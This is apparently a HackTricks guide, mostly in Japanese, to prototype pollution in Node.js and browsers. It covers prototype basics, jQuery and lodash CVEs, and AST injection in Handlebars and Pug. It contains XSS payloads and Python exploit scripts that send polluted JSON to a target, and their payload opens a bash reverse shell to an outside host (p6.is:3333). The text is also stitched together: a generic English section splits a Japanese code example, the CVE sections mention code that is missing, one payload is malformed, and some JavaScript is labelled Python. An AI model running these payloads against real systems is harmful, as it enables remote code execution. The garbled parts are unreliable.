# NodeJS - \_\_proto\_\_ & prototype Pollution

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* あなたは**サイバーセキュリティ会社**で働いていますか？ HackTricksであなたの**会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
* [**公式のPEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ハッキングのトリックを共有するために、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

## JavaScriptのオブジェクト <a href="#053a" id="053a"></a>

まず、JavaScriptの`Object`を理解する必要があります。オブジェクトは、キーと値のペアのコレクションであり、しばしばそのオブジェクトのプロパティと呼ばれます。例えば：

![](<../../../.gitbook/assets/image (389) (1).png>)

JavaScriptでは、`Object`は基本オブジェクトであり、新しく作成されたすべてのオブジェクトのテンプレートです。`Object.create`に`null`を渡すことで空のオブジェクトを作成することも可能です。ただし、新しく作成されたオブジェクトは、渡されたパラメータに対応する型を持ち、すべての基本プロパティを継承します。
```javascript
console.log(Object.create(null)); // prints an empty object
```
![](<../../../.gitbook/assets/image (360).png>)

以前、私たちはJavaScriptのオブジェクトがキーと値のコレクションであることを学びましたので、`null`オブジェクトは単なる空の辞書であることは理にかなっています: `{}`

## JavaScriptの関数/クラス <a href="#55dd" id="55dd"></a>

JavaScriptでは、クラスと関数の概念は非常に関連しています（関数自体がクラスのコンストラクタとして機能し、実際の性質ではJavaScriptには「クラス」の概念はありません）。次の例を見てみましょう:
```javascript
function person(fullName, age) {
this.age = age;
this.fullName = fullName;
this.details = function() {
return this.fullName + " has age: " + this.age;
}
}
```
![](<../../../.gitbook/assets/image (361).png>)

# Node.js Proto/Prototype Pollution

Node.js applications that use user input to dynamically create objects can be vulnerable to Proto/Prototype Pollution attacks. This type of attack occurs when an attacker is able to modify the `__proto__` or `prototype` property of an object, leading to unexpected behavior or even remote code execution.

## How does Proto/Prototype Pollution work?

Proto/Prototype Pollution attacks take advantage of the way JavaScript handles object inheritance. In JavaScript, objects can inherit properties and methods from a prototype object. By modifying the `__proto__` or `prototype` property of an object, an attacker can inject malicious properties or modify existing ones.

The impact of Proto/Prototype Pollution attacks can vary depending on the specific vulnerability. In some cases, it may lead to information disclosure, privilege escalation, or even remote code execution.

## Exploiting Proto/Prototype Pollution in Node.js

To exploit Proto/Prototype Pollution in a Node.js application, an attacker needs to identify a vulnerable function that uses user input to create objects. The attacker can then craft a payload that modifies the `__proto__` or `prototype` property of an object.

There are several techniques that can be used to exploit Proto/Prototype Pollution in Node.js, including:

- Modifying the `__proto__` property directly
- Modifying the `prototype` property of a constructor function
- Exploiting chained object creation

## Prevention and Mitigation

To prevent Proto/Prototype Pollution attacks in Node.js applications, it is important to follow secure coding practices:

- Avoid using user input to dynamically create objects without proper validation and sanitization.
- Use a whitelist approach to validate and sanitize user input.
- Implement input validation and sanitization libraries, such as `validator.js` or `DOMPurify`.
- Keep Node.js and its dependencies up to date to benefit from security patches.

By following these best practices, you can reduce the risk of Proto/Prototype Pollution vulnerabilities in your Node.js applications.
```javascript
var person1 = new person("Satoshi", 70);
```
![](<../../../.gitbook/assets/image (362).png>)

## JavaScriptにおけるプロトタイプ <a href="#3843" id="3843"></a>

注意すべき一つのことは、コードを実行する際にプロトタイプ属性を変更/修正/削除することができるということです。例えば、クラスに関数を動的に追加することができます。

![](<../../../.gitbook/assets/image (363).png>)

クラスの関数も変更することができます（`toString`や`valueOf`などの場合）：

![](<../../../.gitbook/assets/image (364).png>)

![](<../../../.gitbook/assets/image (365).png>)

## 継承

プロトタイプベースのプログラムでは、オブジェクトはクラスからプロパティ/メソッドを継承します。クラスは、他のクラスのインスタンスにプロパティ/メソッドを追加するか、空のオブジェクトに追加することで派生します。

注意点として、オブジェクトにプロパティを追加する場合（例：myPersonObj）、そのプロトタイプとして使用されるオブジェクトのセットに対しても新しいプロパティが追加されますが、そのプロパティは明示的に呼び出されない限り表示されません。

![](<../../../.gitbook/assets/image (366).png>)

## \_\_proto\_\_の汚染 <a href="#0d0a" id="0d0a"></a>

すでに学んだとおり、**JavaScriptのすべてのオブジェクトは単にキーと値のコレクション**であり、**すべてのオブジェクトはJavaScriptのObject型から継承**されることを覚えておく必要があります。これはつまり、Object型を汚染することができれば、**環境内のすべてのJavaScriptオブジェクトが汚染される**ということです！

これは非常にシンプルで、任意のJavaScriptオブジェクトのいくつかのプロパティ（キーと値のペア）を変更できれば良いだけです。なぜなら、各オブジェクトはObjectから継承しているため、各オブジェクトはObjectのスキーマにアクセスできるからです。
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
```
前の例から、次の方法を使用してObjectの構造にアクセスすることができます。
```javascript
person1.__proto__.__proto__
person.__proto__.__proto__
```
したがって、以前に述べたように、もし今、オブジェクトスキームにプロパティが追加された場合、すべてのJavaScriptオブジェクトは新しいプロパティにアクセスできるようになります。
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person1.__proto__.__proto__.printHello = function(){console.log("Hello");}
person1.printHello() //This now works and prints hello
//Add constant as new property
person1.__proto__.__proto__.globalconstant = true
person1.globalconstant  //This now works and is "true"
```
## プロトタイプ汚染

このテクニックは、JSオブジェクトのスキーマを汚染することはできないため、前のテクニックほど効果的ではありません。ただし、**キーワード`__proto__`が禁止されている場合には、このテクニックが役立つことがあります**。

関数のプロパティを変更できる場合、関数の`prototype`プロパティを変更することができます。そして、ここに追加した各新しいプロパティは、その関数から作成された各オブジェクトに継承されます。
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person.prototype.sayHello = function(){console.log("Hello");}
person1.sayHello() //This now works and prints hello
//Add constant as new property
person.prototype.newConstant = true
person1.newConstant //This now works and is "true"

//The same could be achieved using this other way:
person1.constructor.prototype.sayHello = function(){console.log("Hello");}
person1.constructor.prototype.newConstant = true
```
この場合、`person`クラスから作成された**オブジェクトのみ**が影響を受けますが、それぞれのオブジェクトは今や`sayHello`と`newConstant`のプロパティを**継承**します。

**すべてのJSオブジェクトを汚染するために、プロトタイプ汚染を悪用する方法は2つあります。**

最初の方法は、**Object**のプロパティプロトタイプを汚染することです（前述のように、すべてのJSオブジェクトはこれを継承しています）。
```javascript
Object.prototype.sayBye = function(){console.log("bye!")}
```
もし成功すれば、各JSオブジェクトは`sayBye`関数を実行することができるようになります。

もう一つの方法は、次の例のように、辞書変数のコンストラクタのプロトタイプを汚染することです。
```javascript
something = {"a": "b"}
something.constructor.prototype.sayHey = function(){console.log("Hey!")}
```
そのコードを実行すると、**各JSオブジェクトが`sayHey`関数を実行できるようになります**。

## 他のオブジェクトの汚染

### クラスからObject.prototypeへ

特定のオブジェクトを**汚染することができ**、**`Object.prototype`に到達する必要がある**シナリオでは、次のようなコードでそれを検索することができます：
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### 配列要素の汚染

JSではオブジェクトの属性を汚染することができるため、配列にアクセスできる場合は、**インデックスによってアクセス可能な配列の値も汚染する**ことができます（値を上書きすることはできないため、使用されているが書き込まれていないインデックスを汚染する必要があります）。
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Html要素の汚染

JSを使用してHTML要素を生成する際に、**`innerHTML`**属性を**上書き**して、**任意のHTMLコードを書き込む**ことができます。[この解説記事のアイデアと例を参考にしました](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/)。

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## 例

### 基本的な例

では、プロトタイプ汚染はどこにありますか？それは、アプリケーションにバグがある場合に起こります。このバグにより、`Object.prototype`のプロパティを上書きすることが可能になります。通常のオブジェクトは、`Object.prototype`からプロパティを継承しているため、アプリケーションの動作を変更することができます。最も一般的に示される例は次のとおりです：
```javascript
if (user.isAdmin) {   // do something important!}
```
想像してみてください、`Object.prototype.isAdmin = true`を設定することが可能なプロトタイプ汚染が存在するとします。その場合、アプリケーションが明示的に値を割り当てていない限り、`user.isAdmin`は常にtrueになります！

![](https://research.securitum.com/wp-content/uploads/sites/2/2019/10/image-1.png)

例えば、`obj[a][b] = value`とします。攻撃者が`a`と`value`の値を制御できる場合、`a`の値を`__proto__`に調整するだけで（JavaScriptでは、`obj["__proto__"]`と`obj.__proto__`は完全に同等です）、アプリケーション内のすべての既存オブジェクトのプロパティ`b`が`value`に割り当てられます。

ただし、攻撃は上記のように単純ではありません。[論文](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript\_prototype\_pollution\_attack\_in\_NodeJS.pdf)によると、次の3つの条件のいずれかが満たされた場合にのみ攻撃が可能です：

* 再帰的なマージを実行する
* パスによるプロパティの定義
* オブジェクトのクローン

### 関数の上書き
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Proto Pollutionを利用したRCE

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

## クライアント側のプロトタイプ汚染によるXSS

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019–11358: jQuery $ .extendを介したプロトタイプ汚染攻撃

$ .extendは、誤って処理されると、オブジェクト`prototype`（アプリ内のオブジェクトのテンプレート）のプロパティを変更することができます。この属性は、その後すべてのオブジェクトに表示されます。なお、$ .extendの「深い」バージョン（つまりg）のみが影響を受けます。

プログラマーは、この関数をオブジェクトの複製やデフォルトオブジェクトからの新しいプロパティの入力に使用することがよくあります。例えば：

`myObject`がユーザーからの入力フィールドであり、DBにシリアル化されると想像できます）

このコードでは、実行時に`isAdmin`属性が新しく作成されたオブジェクトに割り当てられると思われがちです。しかし、実際には、それは直接`{}`に割り当てられ、その後`{}.isAdmin`は`true`になります。このコードの後に、以下のチェックを実行するとします：
```javascript
If (user.isAdmin === true) {
// do something for admin
}
```
もしユーザーがまだ存在していない場合（ `undefined` ）、`isAdmin` プロパティはその親オブジェクトで検索されます。親オブジェクトには、上記で値が `true` の `isAdmin` が追加されています。

JQuery 3.3.1 で実行した場合の別の例：
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))
console.log({}.devMode); // true
```
これらのエラーは、特にNodeJSプロジェクトに多大な影響を与える可能性があります。最も実用的な例は、2018年12月にMongooseで発生したエラーです。Mongooseは、MongoDBを操作するのに役立つJSライブラリで、広く使われています。

### CVE-2018–3721、CVE-2019–10744: lodashを介したプロトタイプ汚染攻撃

[Lodash](https://www.npmjs.com/package/lodash)もよく知られたライブラリで、さまざまな関数を提供しており、週に1900万回以上ダウンロードされています。そして、JQueryと同じ問題があります。

**CVE-2018–3721**

**CVE-2019–10744**

このバグは、Lodashのすべてのバージョンに影響を与えますが、バージョン4.17.11で修正されています。

### 他のCVEを含むチュートリアル

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

## ASTプロトタイプ汚染

NodeJSでは、テンプレートエンジンやTypeScriptなどでASTが頻繁に使用されます。

テンプレートエンジンの場合、構造は上記のようになります。

![img](https://blog.p6.is/img/2020/08/graph\_3.jpg)

### Handlebars

情報は[https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)から取得しました。

`Object.prototype.pendingContent`に任意の文字列を挿入することで、攻撃の可能性を判断できます。これにより、ブラックボックス環境でプロトタイプ汚染が存在する場合に、サーバーがHandlebarsエンジンを使用していることを確認できます。
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js -->

...
appendContent: function appendContent(content) {
if (this.pendingContent) {
content = this.pendingContent + content;
} else {
this.pendingLocation = this.source.currentLocation;
}

this.pendingContent = content;
},
pushSource: function pushSource(source) {
if (this.pendingContent) {
this.source.push(this.appendToBuffer(this.source.quotedString(this.pendingContent), this.pendingLocation));
this.pendingContent = undefined;
}

if (source) {
this.source.push(source);
}
}
...
```
これは、`javascript-compiler.js`の`appendContent`関数によって行われます。\
`appendContent`は次のようになります。`pendingContent`が存在する場合、コンテンツに追加して返します。

`pushSource`は`pendingContent`を`undefined`にし、文字列が複数回挿入されるのを防ぎます。

**攻撃手法**

![img](https://blog.p6.is/img/2020/08/graph\_5.jpg)

Handlebarsは上記のグラフのように機能します。

レキサーとパーサーがASTを生成した後、それは`compiler.js`に渡されます。\
生成されたテンプレート関数をいくつかの引数と共に実行することができ、それは「Hello posix」という文字列を返します（msgがposixの場合）。
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js -->

case 36:
this.$ = { type: 'NumberLiteral', value: Number($$[$0]), original: Number($$[$0]), loc: yy.locInfo(this._$) };
break;
```
handlebarsのパーサーは、NumberLiteral型のノードの値を常にNumberコンストラクターを通じて数値に強制します。しかし、プロトタイプ汚染を使用して、ここに非数値の文字列を挿入することができます。
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/base.js -->

function parseWithoutProcessing(input, options) {
// Just return if an already-compiled AST was passed in.
if (input.type === 'Program') {
return input;
}

_parser2['default'].yy = yy;

// Altering the shared object here, but this is ok as parser is a sync operation
yy.locInfo = function (locInfo) {
return new yy.SourceLocation(options && options.srcName, locInfo);
};

var ast = _parser2['default'].parse(input);

return ast;
}

function parse(input, options) {
var ast = parseWithoutProcessing(input, options);
var strip = new _whitespaceControl2['default'](options);

return strip.accept(ast);
}
```
最初に、compile関数を見てみましょう。この関数は、ASTオブジェクトとテンプレート文字列の2つの入力方法をサポートしています。

もしinput.typeが`Program`である場合、実際の入力値は文字列ですが、パーサーはそれをparser.jsによってすでにASTにパースされたものと見なし、何の処理もせずにコンパイラに送ります。
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js -->

...
accept: function accept(node) {
/* istanbul ignore next: Sanity code */
if (!this[node.type]) {
throw new _exception2['default']('Unknown type: ' + node.type, node);
}

this.sourceNode.unshift(node);
var ret = this[node.type](node);
this.sourceNode.shift();
return ret;
},
Program: function Program(program) {
console.log((new Error).stack)
this.options.blockParams.unshift(program.blockParams);

var body = program.body,
bodyLength = body.length;
for (var i = 0; i < bodyLength; i++) {
this.accept(body[i]);
}

this.options.blockParams.shift();

this.isSimple = bodyLength === 1;
this.blockParams = program.blockParams ? program.blockParams.length : 0;

return this;
}
```
コンパイラはASTオブジェクト（実際には文字列）を受け取り、`accept`メソッドに送ります。そして、`accept`はコンパイラの`this[node.type]`を呼び出します。次に、ASTのbody属性を取得し、それを関数の構築に使用します。
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];


const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());

/*
function (container, depth0, helpers, partials, data) {
var stack1, lookupProperty = container.lookupProperty || function (parent, propertyName) {
if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {
return parent[propertyName];
}
return undefined
};

return ((stack1 = (lookupProperty(helpers, "undefined") || (depth0 && lookupProperty(depth0, "undefined")) || container.hooks.helperMissing).call(depth0 != null ? depth0 : (container.nullContext || {}), console.log(process.mainModule.require('child_process').execSync('id').toString()), {
"name": "undefined",
"hash": {},
"data": data,
"loc": {
"start": 0,
"end": 0
}
})) != null ? stack1 : "");
}
*/
```
以下のように攻撃を設定することができます。パーサーを通過した場合、NumberLiteralの値に割り当てることができない文字列を指定します。しかし、注入されたASTが処理されると、任意のコードを関数に挿入することができます。

**例**

[https://github.com/hughsk/flat/issues/105](https://github.com/hughsk/flat/issues/105)
```python
import requests

TARGET_URL = 'http://p6.is:3000'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
### Pug

詳細は[https://blog.p6.is/AST-Injection/#Pug](https://blog.p6.is/AST-Injection/#Pug)を参照してください。
```python
import requests

TARGET_URL = 'http://p6.is:3000'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
## どうすれば予防できるのか？

* `Object.freeze (Object.prototype)`を使用してプロパティを凍結する
* アプリケーションのスキーマに従ってJSON入力を検証する
* 安全でない方法で再帰的なマージ関数を使用しない
* プロトタイプチェーンに影響を与えないように、`Object.create(null)`などのプロトタイププロパティのないオブジェクトを使用する
* `Object`の代わりに`Map`を使用する
* 定期的にライブラリの新しいパッチを更新する

## 参考

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンを入手**したいですか？または、**HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出**してください。

</details>
